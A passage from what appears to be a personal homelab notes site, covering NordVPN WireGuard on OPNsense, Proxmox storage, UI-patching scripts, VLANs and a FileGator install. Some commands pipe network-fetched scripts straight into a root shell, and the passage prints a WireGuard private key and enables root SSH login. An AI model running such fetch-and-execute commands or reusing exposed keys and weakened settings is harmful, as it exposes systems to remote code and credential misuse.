at\u00a0https://10.10.1.1</p>"},{"location":"Green%20Cell/01.%20Infrastructure/OPNsense/NordLynx%20Wireguard%20Configuration/","title":"NordLynx Wireguard Configuration","text":"<p>Requirements for Configuration: - NordVPN - Linux Host</p> <pre><code>WireGuard Setup:\n----------------\n(Linux CLI Configuration)\nsudo apt install wireguard\ncurl https://downloads.nordcnd.com/apps/linux/install.sh | sudo sh\ncurl ifconfig.me\nsudo nordvpn login\nsudo nordvpn set technology NordLynx\nsudo nordvpn connect\ncurl ifconfig.me\nsudo wg\nip address show nordlynx\nsudo wg show nordlynx private-key\n\n(Potential Windows CLI Configuration)\nhttps://support.nordvpn.com/Connectivity/Windows/1350897482/Connect-to-NordVPN-app-on-Windows-using-the-Command-Prompt.htm\n\n\nLocal:\n------\nName            : NordVPN\nPublic Key      : oJ7Sh0R110zLhQ6w3ZI1OzS2dQeyy0Jf0iMj9w1kiDI=\nPrivate Key     : EJdPXa4KrnTVeA+VtRCJftOPQpLxDQg34eClXvQk41c=\nListen Port     : 55569\nTunnel Address  : 10.5.0.2/32\nPeers:          : us8192.nordvpn.com\n\nEndpoint:\n---------\nName            : us8192.nordvpn.com\nPublic Key      : Ew0CPosTB0dTZRKx9XyAblENRsyey7gPhNmp64sceVo=\nAllowed IPs     : 0.0.0.0/0\nEndpoint Address: 185.93.0.116\nEndpoint Port   : 51820\n\n\nWireGuard / NordLynx Gateway\n----------------------------\n- Name                  : WAN_NordVPN\n- Interface             : NordLynx\n- Address Family        : IPv4\n- IP Address            : 10.5.0.1\n- Far Gateway           : [x]\n- Disable GW Monitoring : [x]\n\n\nRules --&gt; LAN\n-------------\n[Rule 1] Allow desired host(s) to travel through WireGuard gateway\n- Action    : Pass\n- Interface : LAN\n- Source    : VPN_Test (Alias: desired host(s) to route through tunnel)\n- Gateway   : WAN_NordVPN\n\n\nRules --&gt; NAT --&gt; Outbound\n--------------------------\n[x] Hybrid outbound NAT rule generation\n\n[Rule 1] NAT desired host(s) to WireGuard interface\n- Interface    : NordLynx\n- Source       : VPN_Test (Alias: desired host(s) to route through tunnel)\n- Trans/Target : Interface address\n\n\nRules --&gt; NAT --&gt; Port Foward\n-----------------------------\n[Rule] Remedy DNS leak\n- Interface          : NordLynx\n- Protocol           : TCP/UDP\n- Source             : VPN_Test (Alias: desired host(s) to route through tunnel)\n- Destination/Invert : [x]\n- Destionation       : NordVPN_DNS (Alias: NordVPN public DNS servers)\n- Destination Port   : DNS\n- Redir Target IP    : NordVPN_DNS (Alias: NordVPN public DNS servers)\n- Redir Target Port  : DNS\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/1.%20Installation/","title":"1. Installation","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/2.%20Storage%20Configuration/","title":"2. Storage Configuration","text":""},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/2.%20Storage%20Configuration/#default-behavior","title":"Default Behavior","text":"<p>By default, Proxmox VE allocates a 100GB logical volume for <code>/dev/pve/data</code>, which is primarily used for storing ISO images, templates, backups, and other Proxmox-specific data. This storage is not intended for use by VMs or LXCs.</p> <p>The purpose of this logical volume is to provide a dedicated storage location for Proxmox-specific files and data, as well as to ensure that system files and data do not consume this storage space.</p> <p>For VM and LXC storage, Proxmox VE typically uses a different logical volume or storage subsystem. VM and LXC storage is managed separately, and administrators can configure storage resources for VMs and LXCs as needed, typically using dedicated storage pools or directories.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/2.%20Storage%20Configuration/#custom-configuration","title":"Custom Configuration","text":"<p>In my example, I have three NVME drives, and would like to pool all of their resources together into a singular logical volume that can be utilized for everything -- VM storage, LXC storage, ISOs, templates, etc.  On top of this, I want that 100GB of storage back to maximize my potential storage space.</p> <p>Warning</p> <p>Proceed at your own risk.  My configuration is not in RAID, so I am trusting that these NVME drives are stable wihtout proper redundancy or backups. - I am living on the edge.</p> <p>To accomplish that goal, I ran the following on my Proxmox host:</p> <pre><code># Identify the extra drives on the system\n# (e.g., nvme1n1 and nvme2n1)\nfdisk -l | grep \"Disk /\"\n\n# Remove any pre-existing logical volume that you want to extend\nlvremove /dev/pve/data\n\n# Extend the PVE volume group to include the two extra drives\nvgextend pve /dev/nvme1n1 /dev/nvme2n1\n\n# Verify that the volume group has been extended\nvgdisplay pve\n\n# Resize the logical volume to use 100% of available free space\nlvresize -l +100%FREE /dev/pve/root\n\n# Resize the file system within the logical volume\nresize2fs /dev/mapper/pve-root\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Adding%20CPU%20Temperature%20Readings%20to%20Summary/","title":"Adding CPU Temperature Readings to Summary","text":"<ul> <li>This note is taken from my ProxmoxMaster repository.</li> </ul> <pre><code>#!/bin/bash\n\n# AUTHOR: Tyler McCann (@tylerdotrar)\n# ARBITRARY VERSION NUMBER: 1.0.0\n# LINK: https://github.com/tylerdotrar/ProxmoxMaster\n\n\n# Validate script is being ran with elevated privileges\nif [ \"$EUID\" -ne 0 ]\n  then echo \"Script must be ran as root.\"\n  exit\nfi\n\n# Visual formatting of output\nprint_yellow() {\n  echo -e \"$(tput setaf 3)$1$(tput setaf 7)\"\n}\n\n# Target File for Node Hardware Monitoring\nnodes='/usr/share/perl5/PVE/API2/Nodes.pm'\nnodes_bak=\"${nodes}.bak\" # Backup of original file\nnodes_tmp=\"${nodes}.tmp\" # Temporary file storing custom contents\n\n# Target File for Summary Page Formatting\nmanager='/usr/share/pve-manager/js/pvemanagerlib.js'\nmanager_bak=\"${manager}.bak\" # Backup of original file\nmanager_tmp=\"${manager}.tmp\" # Temporary file storing custom contents\n\n\n### Step 1: Setup CPU temp monitoring\nprint_yellow \"[+] Attempting to install and execute 'sensors' tool...\"\napt install lm-sensors -y\nsensors-detect --auto\nprint_yellow \" o  Done.\\n\"\n\n\n### Step 2: Add Node CPU Temperature Readings\nprint_yellow \"[+] Adding sensors reference to '$nodes'...\"\n\n# Create backup of target file\nprint_yellow \" o  Backup file created: '$nodes_bak'\"\ncp $nodes $nodes_bak\n\n# Insert sensors reference\necho -e '\\n\\t# Added Reference for CPU Temperature Readings\n\\t$res-&gt;{CPUtemperature} = `sensors`;' &gt; $nodes_tmp\n\n# Get line number of unique string and paste contents immediately after\nline_node=$(grep -n '$dinfo' $nodes | head -1 | cut -f1 -d:)\nsed -i \"$line_node r $nodes_tmp\" $nodes\n\n# Remove temp contents file\nrm $nodes_tmp\nprint_yellow \" o  Done.\\n\"\n\n\n### Step 3: Display Readings on Proxmox Summary\nprint_yellow \"[+] Formatting CPU temperature readings in '$manager'...\"\n\n# Create backup of target file\nprint_yellow \" o  Backup file created: '$manager_bak'\"\ncp $manager $manager_bak\n\n# Insert CPU formatting (Package + Cores 0-3)\necho -e '\\t// Added Formatting for CPU Temperature Readings\n\\t{\n    \\titemId: \"CPUtemperature\",\n    \\tcolspan: 2,\n    \\tprintBar: false,\n    \\ttitle: gettext(\"CPU Temperature\"),\n    \\ttextField: \"CPUtemperature\",\n    \\trenderer: function(value) {\n        \\tconst package = value.match(/Package id 0.*?\\+([\\d\\.]+)\u00c2/)[1];\n        \\tconst c0 = value.match(/Core 0.*?\\+([\\d\\.]+)\u00c2/)[1];\n        \\tconst c1 = value.match(/Core 1.*?\\+([\\d\\.]+)\u00c2/)[1];\n        \\tconst c2 = value.match(/Core 2.*?\\+([\\d\\.]+)\u00c2/)[1];\n        \\tconst c3 = value.match(/Core 3.*?\\+([\\d\\.]+)\u00c2/)[1];\n        \\treturn `Package: ${package}\u2103 | Core 0: ${c0}\u2103 | Core 1: ${c1}\u2103 | Core 2: ${c2}\u2103 | Core 3: ${c3}\u2103`\n    \\t}\n\\t},' &gt; $manager_tmp\n\n# Get line number of unique string (+ 2) and paste contents immediately after\nline=$(grep -n 'Proxmox.Utils.render_cpu_model' $manager | cut -f1 -d:)\nline_p2=$((line + 2))\nsed -i \"$line_p2 r $manager_tmp\" $manager\n\n# Remove temp contents file\nrm $manager_tmp\nprint_yellow \" o  Done.\\n\"\n\n\n### Step 4: Restart the Summary Page\nprint_yellow \"[+] Restarting 'pveproxy' to reload the summary page...\"\nsystemctl restart pveproxy\nprint_yellow \" o  You will need to reload your page/clear your cache to see these changes (or open with a private window).\"\nprint_yellow \" o  Done.\\n\"\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/CLI%20Information%20%26%20Helpers/","title":"CLI Information & Helpers","text":""},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/CLI%20Information%20%26%20Helpers/#key-file-locations","title":"Key File Locations","text":"<p>Configuration files for LXC's: - <code>/etc/pve/nodes/&lt;node_name&gt;/lxc/&lt;id&gt;.conf</code></p> <p>Configuration files for VM's: - <code>/etc/pve/qemu-server/&lt;id&gt;.conf</code></p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/CLI%20Information%20%26%20Helpers/#startingstopping-from-the-cli","title":"Starting/Stopping from the CLI","text":"<pre><code># Interacting with existing VMs\nqm list                  # List all virtual machines\nqm start &lt;vmid&gt;          # Start VM\nqm reboot &lt;vmid&gt;         # Reboot VM (shutdown, start)\nqm shutdown &lt;vmid&gt;       # Gracefully stop VM (send poweroff)\nqm stop &lt;vmid&gt;           # Kill VM (immediate stop)\nqm reset &lt;vmid&gt;          # Reset VM (stop, start)\nqm suspend &lt;vmid&gt;        # Suspend VM\nqm resume &lt;vmid&gt;         # Resume VM\n\nqm destroy &lt;vmid&gt;        # Destroy VM (delete all files)\n\n\n# Interacting with existing LXCs\npct list                 # List all LXC's\npct start &lt;vmid&gt;         # Start LXC\npct reboot &lt;vmid&gt;        # Reboot LXC (shutdown, start)\npct shutdown &lt;vmid&gt;      # Gracefully stop LXC (send poweroff)\npct stop &lt;vmid&gt;          # Kill LXC (immediate stop)\npct suspend &lt;vmid&gt;       # Suspend LXC\npct resume &lt;vmid&gt;        # Resume LXC\n\npct clone &lt;vmid&gt; &lt;newid&gt; # Copy LXC\npct destroy &lt;vmid&gt;       # Destroy LXC (delete all files)\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/CLI%20Information%20%26%20Helpers/#useful-scripts","title":"Useful Scripts","text":"<ul> <li><code>lsiommu.sh</code> - List IOMMU groups with correlated devices.</li> </ul> <pre><code>#!/usr/bin/env bash\n\n# Requires: lspci, lsusb\nshopt -s nullglob\nlastgroup=\"\"\nfor g in `find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V`; do\n    for d in $g/devices/*; do\n        if [ \"${g##*/}\" != \"$lastgroup\" ]; then\n            echo -en \"Group ${g##*/}:\\t\"\n        else\n            echo -en \"\\t\\t\"\n        fi\n        lastgroup=${g##*/}\n        lspci -nms ${d##*/} | awk -F'\"' '{printf \"[%s:%s]\", $4, $6}'\n        if [-e \"$d\"/reset](&lt;../../../../-e \"$d\"/reset.md&gt;); then echo -en \" [R] \"; else echo -en \"     \"; fi\n\n        lspci -mms ${d##*/} | awk -F'\"' '{printf \"%s %-40s %s\\n\", $1, $2, $6}'\n        for u in ${d}/usb*/; do\n            bus=$(cat \"${u}/busnum\")\n            lsusb -s $bus: | \\\n                awk '{gsub(/:/,\"\",$4); printf \"%s|%s %s %s %s|\", $6, $1, $2, $3, $4; for(i=7;i&lt;=NF;i++){printf \"%s \", $i}; printf \"\\n\"}' | \\\n                awk -F'|' '{printf \"USB:\\t\\t[%s]\\t\\t %-40s %s\\n\", $1, $2, $3}'\n        done\n    done\ndone\n</code></pre> <ul> <li>Example Output: </li> </ul> IOMMU Group Vendor:Device Reset Device ID Description Device Group 24: [8086:24fd] [R] 02:00.0 Network controller Wireless 8265 / 8275 <p>You can then take the Device ID and feed it into <code>lspci</code> to get verbose information on that device. <pre><code># Return Very Verbose information on the Network Controller\nlspci -s 02:00.0 -vv\n</code></pre></p> <p>Another interesting way to get this information is: <pre><code>pvesh get /nodes/&lt;node_name&gt;/hardware/pci --pci-class-blacklist \"\"\n</code></pre></p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Enabling%20IOMMU/","title":"Enabling IOMMU","text":"<p>Info</p> <p>This will be beautified later.</p> <p>Modify <code>/etc/default/grub</code>: <pre><code># Comment out\n#GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\n\n# For AMD, add:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet amd_iommu=on\"\n# For Intel, add: \nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on\"\n</code></pre></p> <p>Update grub. <pre><code>update-grub\n</code></pre></p> <p>Add the following to <code>/etc/modules</code>: <pre><code>vfio\nvfio_iommu_type1\nvfio_pci\nvfio_virqfd\n</code></pre></p> <p>Reboot the node.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Remove%20Subscription%20Message/","title":"Remove Subscription Message","text":"<ul> <li>This note is taken from my ProxmoxMaster repository.</li> </ul> <pre><code>#!/bin/bash\n\n# AUTHOR: Tyler McCann (@tylerdotrar)\n# ARBITRARY VERSION NUMBER: 1.0.0\n# LINK: https://github.com/tylerdotrar/ProxmoxMaster\n\n\n# Validate script is being ran with elevated privileges\nif [ \"$EUID\" -ne 0 ]\n  then echo \"Script must be ran as root.\"\n  exit\nfi\n\n# Visual formatting of output\nprint_yellow() {\n  echo -e \"$(tput setaf 3)$1$(tput setaf 7)\"\n}\n\n# Target File(s)\nsub_file='/usr/share/javascript/proxmox-widget-toolkit/proxmoxlib.js'\nsub_file_bak=\"${sub_file}.bak\" # Backup of original file\n\n\n### Step 1: Remove 'No valid subscription' message.\nprint_yellow \"[+] Voiding 'No valid subscription' message from '$sub_file'...\"\n\n# Create backup of target file\ncp $sub_file $sub_file_bak\nprint_yellow \" o  Backup file created: '$sub_file_bak'\"\n\n# Get line number of unique string (- 1) and replace contents\nline=$(grep -n 'No valid subscription' $sub_file | cut -f1 -d:)\nline_p2=$((line - 1))\nsed -i \"${line_p2}c\\\\\\t\\t\\t//Removed 'No valid subscription' message\\n\\t\\t\\tvoid({ //Ext.Msg.show({\" $sub_file\nprint_yellow \" o  Done.\\n\"\n\n\n### Step 2: Restart PVE to take effect\nprint_yellow \"[+] Restarting 'pveproxy' for changes to take effect...\"\nsystemctl restart pveproxy\nprint_yellow \" o  You will need to reload your page/clear your cache to see these changes (or open with a private window).\"\nprint_yellow \" o  Done.\\n\"\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/VLAN%20Support/","title":"VLAN Support","text":"<p>The following note will be a VLAN Walkthrough using OPNsense &amp; Proxmox.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/VLAN%20Support/#opnsense-vlan-configuration","title":"OPNsense VLAN Configuration","text":"<ul> <li> <p>OPNSENSE -&gt; Interfaces -&gt; Other Types -&gt; VLAN</p> <ul> <li>Chose Parent (physical) interface</li> <li>Give new device name (vlan0.x) and VLAN tag x (e.g., vlan0.300, tag: 300)</li> <li>Apply changes.</li> </ul> </li> <li> <p>OPNSENSE -&gt; Interfaces -&gt; Assignments</p> <ul> <li>Select created VLAN device as 'New Interface'</li> <li>Give the new interface a description (e.g., 'Example', etc.)</li> <li>Select the \"+\" sign on the right (add)</li> <li>Save changes.</li> </ul> </li> <li> <p>OPNSENSE -&gt; Interfaces -&gt; [Example]</p> <ul> <li>Enable interface</li> <li>Set IPv4 Configuration Type to: \"Static IPv4\"</li> <li>Input desired IP address and network CIDR for that interface (e.g., \"10.10.10.1/25\")</li> <li>Save changes.</li> </ul> </li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/VLAN%20Support/#proxmox-vlan-configuration","title":"Proxmox VLAN Configuration","text":"<ul> <li> <p>PROXMOX -&gt; Datacenter -&gt;  -&gt; System -&gt; Network <ul> <li>Create a Linux Bridge (vmbr)</li> <li>Make it 'VLAN aware'</li> <li>Bridge the physical port being used for the VLAN</li> <li>Add a comment denoting what the bridge is for (e.g., \"Example (Tag: 300)\")</li> <li>Create bridge.</li> </ul> <li> <p>PROXMOX -&gt; Datacenter -&gt;  -&gt; System -&gt; Network <ul> <li>Create a Linux VLAN</li> <li>Set the VLAN name as \".\" (e.g., \"vmbr1.300\") <li>Set the IPv4/CIDR to match the VLAN interface assignment (e.g., \"10.10.10.0/25\")</li> <li>NO gateway.</li> <li>Add a comment denoting what the VLAN is for (e.g., \"Example\")</li> <li>Create VLAN</li> <li> <p>PROXMOX -&gt; Datacenter -&gt;  -&gt; System -&gt; Network <ul> <li>Select \"Apply Configuration\" to save changes.</li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/VLAN%20Support/#creating-lxcs-and-vms","title":"Creating LXC's and VM's","text":"<ul> <li>PROXMOX -&gt; Create VM / Create CT<ul> <li>Configure as you would any other virtual machine / LXC</li> <li>Select the created Linux Bridge (vmbr) as the networking bridge.</li> <li>Specify the VLAN tag to use (which should helpfully be noted in the bridge comment).</li> </ul> </li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/VLAN%20Support/#original-note-temporary","title":"Original Note (Temporary)","text":"<pre><code>### VLAN Walkthrough using OPNsense &amp; Proxmox\n\n# OPNsense VLAN Configuration\n&gt; OPNSENSE -&gt; Interfaces -&gt; Other Types -&gt; VLAN\n- Chose Parent (physical) interface\n- Give new device name (vlan0.x) and VLAN tag x (e.g., vlan0.300, tag: 300)\n- Apply changes.\n\n&gt; OPNSENSE -&gt; Interfaces -&gt; Assignments\n- Select created VLAN device as 'New Interface'\n- Give the new interface a description (e.g., 'Example', etc.)\n- Select the \"+\" sign on the right (add)\n- Save changes.\n\n&gt; OPNSENSE -&gt; Interfaces -&gt; [Example]\n- Enable interface\n- Set IPv4 Configuration Type to: \"Static IPv4\"\n- Input desired IP address and network CIDR for that interface (e.g., \"10.10.10.1/25\")\n- Save changes.\n\n# Proxmox VLAN Configuration\n&gt; PROXMOX -&gt; Datacenter -&gt; \"YourNodeName\" -&gt; System -&gt; Network\n- Create a Linux Bridge (vmbr)\n- Make it 'VLAN aware'\n- Bridge the physical port being used for the VLAN\n- Add a comment denoting what the bridge is for (e.g., \"Example (Tag: 300)\")\n- Create bridge.\n\n&gt; PROXMOX -&gt; Datacenter -&gt; \"YourNodeName\" -&gt; System -&gt; Network\n- Create a Linux VLAN\n- Set the VLAN name as \"&lt;linux_bridge&gt;.&lt;vlan_tag&gt;\" (e.g., \"vmbr1.300\")\n- Set the IPv4/CIDR to match the VLAN interface assignment (e.g., \"10.10.10.0/25\")\n- NO gateway.\n- Add a comment denoting what the VLAN is for (e.g., \"Example\")\n- Create VLAN\n\n&gt; PROXMOX -&gt; Datacenter -&gt; \"YourNodeName\" -&gt; System -&gt; Network\n- Select \"Apply Configuration\" to save changes.\n\n# Creating LXC's and VM's\n&gt; PROXMOX -&gt; Create VM / Create CT\n- Configure as you would any other virtual machine / LXC\n- Select the created Linux Bridge (vmbr) as the networking bridge.\n- Specify the VLAN tag to use (which should helpfully be noted in the bridge comment).\n</code></pre>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Virtual%20Machine%20Best%20Practices/","title":"Virtual Machine Best Practices","text":""},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Virtual%20Machine%20Best%20Practices/#overview","title":"Overview","text":"<p>When creating Virtual Machines, there is a staggering and overwhelming amount of options and configurations; knowing which ones are optimal for performance can be daunting.  This will NOT be an expansive and conclusive list of all settings, but rather a short and concise list of settings that are generally safe for optimal performance.</p> <p>Info</p> <p>THIS ASSUMES YOU ARE USING MODERN HARDWARE WITH MINIMAL LEGACY SUPPORT.</p> <ul> <li>E.G.<ul> <li><code>Proxmox VE 7.0</code> or newer (released July 2021).</li> <li><code>Linux Kernel 5.4</code> or newer (released November 2019).</li> <li><code>FreeBSD 12.0</code> or newer (released November 2019).</li> <li><code>Windows 8.1</code> or newer (released October 2013).</li> </ul> </li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Virtual%20Machine%20Best%20Practices/#settings","title":"Settings","text":"<p>Info</p> <p>Make sure to select <code>Advanced</code> to be able to view all VM settings.</p> Creation Tab Setting Value Explanation General N/A N/A N/A OS N/A N/A N/A System Machine q35 <code>q35</code> is newer and supports PCIe. Use <code>i440fx</code> for legacy systems. System BIOS OVFM (UEFI) <code>OVFM</code> virtualizes UEFI and is newer. Use <code>SeaBIOS</code> for classic BIOS and/or ISO's that don't support native EFI boot (e.g., Kali Linux). System Qemu Agent Enabled Allows the Virtual Machine IP address to be visible within Proxmox VM Summary. Disks Bus/Device SCSI <code>SCSI</code> provides faster performance than <code>IDE</code>. Disks SCSI Controller VirtIO SCSI single Provides 1 SCSI controller per disk (faster). Disks Cache Write back Faster than <code>default (no cache)</code>, slightly less safe. Disks Discard Enabled Reclaim/trim unused space on physical storage. Disks IO Thread Enabled Allows each disk to have its own thread instead of waiting in queue with everything else. Disks SSD Emulation Enabled Tells guest OS to treat disk as a non-spinning disk. Ignore if using HDD's. CPU Sockets 1 Workstations rarely have more than 1 CPU socket; adjust accordingly (e.g., a SIEM). CPU Type host Improve CPU performance using full host CPU instruction set. Only drawback is inability to migrate to nodes with different CPU architecture. Memory N/A N/A N/A Network Model VirtIO (paravirtualized) Best network performance. Windows VM's require third-party <code>virtio-win</code> drivers. <p>Note: booting from the ISO for the first time when using OVFM will require you to quickly press any button on launch. Failure to do so will attempt a PXE boot and drop you into the OVFM menu. To attempt a second ISO boot, press ESC (or type 'exit' in the shell), navigate to 'Boot Manager', select your ISO (e.g., DVD-ROM QM00003), and press any button to boot.</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Virtual%20Machine%20Best%20Practices/#windows-vms","title":"Windows VMs","text":"<p>Creating a Windows VM (with optimal performance) requires attaching a second <code>CD/DVD</code> drive containing VirtIO Windows drivers. </p> <ul> <li>The most recent virtio-win drivers can be downloaded here.</li> <li>Upload the ISO to your node ISO pool just like any other VM ISO.</li> </ul> <p>VM Configuration:</p> <ol> <li>Configure the Windows VM using the above configuration, but do NOT boot it.</li> <li>Before booting, navigate to the <code>Hardware</code> tab and select <code>Add --&gt; CD/DVD Drive</code>. </li> <li>Add <code>virtio-win-0.1.&lt;version&gt;.iso</code> using Bus/Device IDE 0.</li> </ol> <p></p> <p>Primary Drivers (Pre-Installation):</p> <ol> <li>Start the VM.</li> <li>When selecting the desired type of installation, select <code>Custom: Install Windows Only (advanced)</code>.</li> <li>Your drives will NOT be shown because the VirtIO drivers haven't been installed yet.  Select <code>Load driver --&gt; Browse --&gt; CD Drive (D:) virtio-win-0.&lt;version&gt;</code></li> <li>From here, you will want three drivers (install each before continuing):<ul> <li>Storage: <code>vioscsi --&gt; &lt;windows_version&gt; --&gt; amd64</code></li> <li>Networking: <code>NetKVM --&gt; &lt;windows_version&gt; --&gt; amd64</code></li> <li>Memory: <code>Balloon --&gt; &lt;windows_version&gt; --&gt; amd64</code></li> </ul> </li> <li>Once your three primary drivers are installed, complete the installation normally.</li> </ol> <p></p> <p>Remaining Drivers (Post-Installation):</p> <ul> <li>Method 1: via GUI<ol> <li>Once you've made it to the Desktop, open up File Explorer and navigate to the <code>D:</code> CD Drive one last time to install the remaining drivers using <code>virtio-win-gt-x64.msi</code> (and optionally QEMU Guest Agent using <code>guest-agent\\qemu-ga-x86_64.msi</code>).<ul> <li>Leaving the default settings is fine.</li> </ul> </li> <li>Once installation is complete, reboot your VM.</li> </ol> </li> </ul> <p></p> <ul> <li>Method 2: via CLI<ol> <li>Once you've made it to the Desktop, open PowerShell and run the following commands:</li> </ol> </li> </ul> <pre><code># Install remaining VirtIO Drivers and QEMU Guest Agent\nmsiexec /i D:\\virtio-win-gt-x64.msi /passive\nmsiexec /i D:\\guest-agent\\qemu-ga-x86_64.msi /passive\n\n# Reboot in 3 second\nshutdown /r /t 3\n</code></pre> <p></p> <p>Cleanup &amp; Backup (optional):</p> <ol> <li>Once your VM has rebooted, gracefully shut down the system.</li> <li>Navigate to the <code>Hardware</code> tab, select your two CD/DVD drives (the ISO and VirtIO drivers), and select <code>Remove</code>. </li> <li>Start your VM, navigate to the <code>Snapshots</code> tab, and take a new snapshot for your fresh Windows installation.</li> </ol> <p></p> <p>Note:  When using Windows 11 (or any VM that requires TPM to be enabled), snapshots are not available.  A workaround for this is to navigate to the <code>Hardware</code> tab, select <code>TPM State</code>, and select <code>Remove</code>. This will allow you to take snapshots while still being able to restart the box. However, if the box is gracefully shutdown it may not be able to start up again (hence why snapshots are recommended).</p>"},{"location":"Green%20Cell/01.%20Infrastructure/Proxmox/Notes/Virtual%20Machine%20Best%20Practices/#underlying-storage","title":"Underlying Storage","text":"<p>Info</p> <p>This section is a work-in-progress based on my current understanding.</p> <ul> <li> <p>When node storage is using Traditional File System or NFS...</p> <ul> <li>Copy on Write (CoW) functionality is NOT present natively.</li> <li><code>.qcow2</code> VM storage allows for snapshot / backup functionality in a tree-like fashion.</li> <li><code>.raw</code> VM storage allows for maximum performance.</li> </ul> </li> <li> <p>When node storage is using ZFS...</p> <ul> <li>Copy on Write (CoW) functionality IS present natively.</li> <li><code>.raw</code> VM storage provides maximum performance, with snapshot / backup functionality still being present but ONLY linearly (not tree-like).</li> </ul> </li> </ul>"},{"location":"Green%20Cell/01.%20Infrastructure/Security%20Onion/1.%20Installation/","title":"1. Installation","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Green%20Cell/02.%20Services/","title":"Services","text":"<ul> <li>Collection of notes dedicated to installation and deployment of different services and servers that can easily be installed on a hypervisor (e.g., Passbolt, PiHole, Stable Diffusion, Minecraft, etc.) The current collection have all been developed for and tested on Proxmox LXCs using an Ubuntu 20.04 image.</li> </ul>"},{"location":"Green%20Cell/02.%20Services/#table-of-contents","title":"Table of Contents","text":""},{"location":"Green%20Cell/02.%20Services/#installations","title":"Installations","text":"<ul> <li>FileGator</li> <li>Homer</li> <li>Organizr</li> <li>Passbolt</li> <li>PiHole</li> <li>Samba Share</li> <li>Stable-Diffusion Web UI</li> <li>Template</li> </ul>"},{"location":"Green%20Cell/02.%20Services/#web-configurations","title":"Web Configurations","text":"<ul> <li>NGINX Reverse Proxy</li> <li>Web Server HTTPS Configurations</li> </ul>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/","title":"FileGator","text":""},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#overview","title":"Overview","text":"<p>Info</p> <p>The FileGator Github repository can be found here.</p> <p>FileGator is a free, open-source, self-hosted web application for file storage and management.  It allows you to store and organize files &amp; folders, while also having multi-user support so you can have admins and other users managing files with different access permissions, roles and home folders.</p> <p></p>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#installation","title":"Installation","text":"<p>Info</p> <p>Example LXC Hardware:  - CPU: 2 cores  - RAM: 2048 MB  - HDD: 200 GB</p> <p>Installation will be done with the goal of avoiding Docker, as well as (optionally) have valid HTTPS certificates to make the service feel more refined.</p>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#method-1-scripted-installation","title":"Method 1: Scripted Installation","text":"<p>For scripted installation, my ProxmoxMaster repository can be utilized.</p> <pre><code># Filegator Install\nbash -c \"$(wget -qO- https://github.com/tylerdotrar/ProxmoxMaster/raw/main/services/filegator.sh)\"\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#method-2-manual-installation","title":"Method 2: Manual Installation","text":""},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#dependencies-downloads","title":"Dependencies &amp; Downloads","text":"<pre><code># Update, Upgrade, and Dependencies\napt update &amp;&amp; apt upgrade -y\napt install -y wget unzip php apache2 libapache2-mod-php php-zip php-mbstring php-dom php-xml\n\n# Download, install, and clean-up FileGator repository\ncd /var/www/\nwget https://github.com/filegator/static/raw/master/builds/filegator_latest.zip\nunzip filegator_latest.zip\nrm filegator_latest.zip\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#site-configuration","title":"Site Configuration","text":"<p>Once dependencies are installed, next is site configuration.  Do you want to run a simple HTTP site or do you want to go the extra mile and have a clean HTTPS setup?  For the latter, you can use OPNsense as a local CA and create local certificates for a homelab environment (example domain: <code>homelab</code>).</p> <p>(Note: alternatively you can use an NGINX reverse proxy for HTTPS support)</p>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#option-1-http","title":"Option 1: HTTP","text":"<p>This configuration will allow you to access the site on port 80, with no further configuration.</p> <pre><code># HTTP Site Configuration\necho \"\n&lt;VirtualHost *:80&gt;\n    DocumentRoot /var/www/filegator/dist\n&lt;/VirtualHost&gt;\n\" &gt;&gt; /etc/apache2/sites-available/filegator.conf\n</code></pre>"},{"location":"Green%20Cell/02.%20Services/Installations/FileGator/#option-2-https","title":"Option 2: HTTPS","text":"<p>This configuration will allow you to access the site with a valid SSL certificate on port 443, but does require further configuration.</p> <pre><code># HTTPS Site Configuration\necho \"\n&lt;VirtualHost *:443&gt;\n    DocumentRoot /var/www/filegator/dist\n    ServerName filegator.homelab\n        SSLEngine on\n        SSLCertificateFile /etc/ssl/filegator/filegator.crt\n        SSLCertificateKeyFile /etc/ssl/filegator/filegator.key\n&lt;/VirtualHost&gt;\n\" &gt;&gt; /etc/apache2/sites-available/filegator.conf\n</code></pre> <p>For the above HTTPS configuration..</p> <pre><code># Enable SSH to SCP certificates into LXC\nnano /etc/ssh/sshd_config\n-------------------------------\nPermitRootLogin yes\n-------------------------------\nsystemctl start sshd\n\nmkdir /etc/ssl/filegator\n\n# Copy generated/downloaded SSL certificates from Host System\n### scp &lt;cert&gt;.crt 